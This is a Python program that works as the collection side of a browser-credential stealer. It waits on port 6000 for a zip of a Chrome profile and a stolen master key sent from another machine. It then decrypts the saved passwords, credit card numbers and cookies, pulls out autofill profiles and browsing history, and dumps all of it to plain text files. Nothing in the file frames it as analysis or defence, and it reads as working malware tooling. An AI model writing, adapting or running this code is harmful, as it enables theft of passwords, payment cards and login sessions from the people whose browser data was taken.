import io
import sqlite3
import os
import zipfile
import socket
import shutil
from Crypto.Cipher import AES
from datetime import datetime, timedelta
import base64

class ChromeDataExtractor:
    def __init__(self, master_key=None):
        self.master_key = master_key
        self.temp_dir = "temp_extracted"
        
    def execute_query(self, db_path, query, params=()):
        """Generic function to execute SQL queries with error handling"""
        if not os.path.exists(db_path):
            print(f"Error: File '{db_path}' not found")
            return []
            
        try:
            with sqlite3.connect(db_path) as conn:
                cursor = conn.cursor()
                cursor.execute(query, params)
                return cursor.fetchall()
        except sqlite3.OperationalError as e:
            print(f"Query failed: {e}")
            return []
    
    def extract_passwords(self, login_data_path):
        passwords = []
        query = "SELECT origin_url, username_value, password_value FROM logins"
        results = self.execute_query(login_data_path, query)
        
        for url, username, encrypted_password in results:
            if not encrypted_password:
                passwords.append((url, username, None, None))
                continue
            password, prefix = self.decrypt_data(encrypted_password)
            passwords.append((url, username, password, prefix))
            
        return passwords
    
    def extract_history(self, history_path):
        history = []
        query = """
            SELECT urls.url, urls.title, visits.visit_time 
            FROM urls 
            JOIN visits ON urls.id = visits.url 
            ORDER BY visits.visit_time DESC
        """
        results = self.execute_query(history_path, query)
        
        for url, title, visit_time in results:
            if visit_time:
                dt = datetime(1601, 1, 1) + timedelta(microseconds=visit_time)
                history.append((url, title, dt.strftime('%Y-%m-%d %H:%M:%S')))
                
        return history
    
    def extract_credit_cards(self, web_data_path):
        credit_cards = []
        query = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
        results = self.execute_query(web_data_path, query)
        
        for name, exp_month, exp_year, encrypted_card in results:
            if encrypted_card:
                card_number, _ = self.decrypt_data(encrypted_card)
                credit_cards.append((name, f"{exp_month}/{exp_year}", card_number))
                
        return credit_cards
    
    def extract_autofill(self, web_data_path):
        query = "SELECT name FROM sqlite_master WHERE type='table';"
        tables = [r[0] for r in self.execute_query(web_data_path, query)]
        
        if 'autofill_profiles' in tables:
            query = """
                SELECT guid, full_name, company_name, street_address, city, state, zipcode, country_code, email_address, phone_number
                FROM autofill_profiles
            """
        elif 'autofill' in tables:
            query = "SELECT name, value, value_lower, date_created, date_last_used, count FROM autofill"
        else:
            print("No autofill table found. Available tables:", tables)
            return []
            
        return self.execute_query(web_data_path, query)
    
    def extract_cookies(self, cookies_path):
        cookies = []
        query = """
            SELECT host_key, name, value, encrypted_value, path, creation_utc, expires_utc, is_secure, is_httponly, last_access_utc
            FROM cookies
        """
        results = self.execute_query(cookies_path, query)
        
        for row in results:
            host_key, name, value, encrypted_value, path, creation_utc, expires_utc, is_secure, is_httponly, last_access_utc = row
            
            if encrypted_value and len(encrypted_value) > 0:
                decrypted_value, _ = self.decrypt_data(encrypted_value)
                value = decrypted_value if decrypted_value is not None else value
            
            # Encode value in base64
            encoded_value = base64.b64encode(value.encode('utf-8')).decode('utf-8')
            
            creation_dt = datetime(1601, 1, 1) + timedelta(microseconds=creation_utc) if creation_utc else None
            expires_dt = datetime(1601, 1, 1) + timedelta(microseconds=expires_utc) if expires_utc else None
            last_access_dt = datetime(1601, 1, 1) + timedelta(microseconds=last_access_utc) if last_access_utc else None

            cookies.append((
                host_key, name, encoded_value, path, 
                creation_dt.strftime('%Y-%m-%d %H:%M:%S') if creation_dt else None, 
                expires_dt.strftime('%Y-%m-%d %H:%M:%S') if expires_dt else None, 
                bool(is_secure), bool(is_httponly), 
                last_access_dt.strftime('%Y-%m-%d %H:%M:%S') if last_access_dt else None
            ))
            
        return cookies
    
    def decrypt_data(self, encrypted_data):
        try:
            if not encrypted_data or len(encrypted_data) < 3:
                return None, None

            prefix = encrypted_data[:3]
            if prefix not in (b'v10', b'v20'):
                return None, prefix

            iv = encrypted_data[3:15]
            ciphertext = encrypted_data[15:-16]
            tag = encrypted_data[-16:]

            cipher = AES.new(self.master_key, AES.MODE_GCM, iv)
            decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)

            return decrypted_data.decode('utf-8', errors='ignore'), prefix
        except Exception as e:
            try:
                pref = encrypted_data[:3]
            except Exception:
                pref = None
            print(f"Decryption error (len={len(encrypted_data)}): {e}")
            return None, pref
    
    def receive_zip_file(self):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind(('0.0.0.0', 6000))
        server_socket.listen(1)
        print("Listening on port 6000...")

        client_socket, addr = server_socket.accept()
        print(f"Connection from {addr}")

        # Receive file size first (4 bytes)
        size_data = client_socket.recv(4)
        if not size_data or len(size_data) != 4:
            print("Invalid size data received")
            client_socket.close()
            server_socket.close()
            return None
            
        file_size = int.from_bytes(size_data, byteorder='little')
        print(f"Expected file size: {file_size} bytes")

        # Receive the zip file
        received_data = b""
        while len(received_data) < file_size:
            data = client_socket.recv(min(4096, file_size - len(received_data)))
            if not data:
                break
            received_data += data

        client_socket.close()
        server_socket.close()

        if len(received_data) != file_size:
            print(f"Incomplete file received: {len(received_data)} bytes instead of {file_size}")
            return None

        # Check if data is a valid ZIP file before saving
        try:
            zipfile.ZipFile(io.BytesIO(received_data))
        except zipfile.BadZipFile:
            print("Received data is not a valid ZIP file")
            return None

        return received_data
    
    def extract_zip_file(self, zip_data):
        temp_zip_path = "chrome.zip"
        with open(temp_zip_path, 'wb') as f:
            f.write(zip_data)

        if os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir)
        os.makedirs(self.temp_dir, exist_ok=True)
        
        try:
            with zipfile.ZipFile(temp_zip_path, 'r') as zip_ref:
                zip_ref.extractall(self.temp_dir)
        except zipfile.BadZipFile as e:
            print(f"ZIP extraction failed: {e}")
            shutil.rmtree(self.temp_dir, ignore_errors=True)
            os.remove(temp_zip_path)
            return None

        extracted_files = {}
        file_mapping = {
            "Login Data": "login_data",
            "History": "history",
            "Web Data": "web_data",
            "Cookies": "cookies",
            "mskey.bin": "master_key"
        }
        
        for root, _, files in os.walk(self.temp_dir):
            for file in files:
                if file in file_mapping:
                    extracted_files[file_mapping[file]] = os.path.join(root, file)

        # Clean up zip file
        if os.path.exists(temp_zip_path):
            os.remove(temp_zip_path)
            
        return extracted_files
    
    def write_to_file(self, filename, header, data, formatter):
        """Generic function to write extracted data to a file"""
        with open(filename, "w", encoding="utf-8") as f:
            f.write(header + "\n")
            for i, item in enumerate(data, 1):
                formatter(f, i, item)
                f.write("-" * 50 + "\n")
        print(f"Successfully extracted {len(data)} entries to {filename}")
    
    def cleanup(self):
        """Clean up temporary files"""
        if os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir)

def main():
    extractor = ChromeDataExtractor()
    
    # Receive and extract zip file
    zip_data = extractor.receive_zip_file()
    if not zip_data:
        print("Failed to receive zip file")
        return
        
    extracted_files = extractor.extract_zip_file(zip_data)
    if not extracted_files:
        print("Failed to extract zip file")
        return
        
    # Load master key
    if 'master_key' not in extracted_files or not os.path.exists(extracted_files['master_key']):
        print("Master key file not found.")
        extractor.cleanup()
        return

    with open(extracted_files['master_key'], 'rb') as f:
        extractor.master_key = f.read()

    # Extract data from each available file
    if 'login_data' in extracted_files:
        passwords = extractor.extract_passwords(extracted_files['login_data'])
        extractor.write_to_file(
            "passwords.txt", 
            "Extracted Chrome Passwords:",
            passwords,
            lambda f, i, item: f.write(
                f"{i}. URL: {item[0]}\n"
                f"   Username: {item[1]}\n"
                f"   Prefix: {item[3]!r}\n"
                f"   Password: {item[2] if item[2] is not None else '<decryption failed or unsupported prefix>'}\n"
            )
        )
    
    if 'history' in extracted_files:
        history = extractor.extract_history(extracted_files['history'])
        extractor.write_to_file(
            "history.txt", 
            "Extracted Chrome Browsing History:",
            history,
            lambda f, i, item: f.write(
                f"{i}. URL: {item[0]}\n"
                f"   Title: {item[1]}\n"
                f"   Visited: {item[2]}\n"
            )
        )
    
    if 'web_data' in extracted_files:
        credit_cards = extractor.extract_credit_cards(extracted_files['web_data'])
        extractor.write_to_file(
            "credit_cards.txt", 
            "Extracted Chrome Credit Cards:",
            credit_cards,
            lambda f, i, item: f.write(
                f"{i}. Name: {item[0]}\n"
                f"   Expiry: {item[1]}\n"
                f"   Card Number: {item[2]}\n"
            )
        )
        
        autofill_profiles = extractor.extract_autofill(extracted_files['web_data'])
        extractor.write_to_file(
            "autofill.txt", 
            "Extracted Chrome Autofill Profiles:",
            autofill_profiles,
            lambda f, i, item: f.write(f"{i}. {item}\n")
        )
    
    if 'cookies' in extracted_files:
        cookies = extractor.extract_cookies(extracted_files['cookies'])
        extractor.write_to_file(
            "cookies.txt", 
            "Extracted Chrome Cookies:",
            cookies,
            lambda f, i, item: f.write(
                f"{i}. Domain: {item[0]}\n"
                f"   Name: {item[1]}\n"
                f"   Value: {item[2]}\n"
                f"   Path: {item[3]}\n"
                f"   Created: {item[4]}\n"
                f"   Expires: {item[5]}\n"
                f"   Secure: {item[6]}\n"
                f"   HttpOnly: {item[7]}\n"
                f"   Last Access: {item[8]}\n"
            )
        )
    
    extractor.cleanup()

if __name__ == "__main__":
    main()
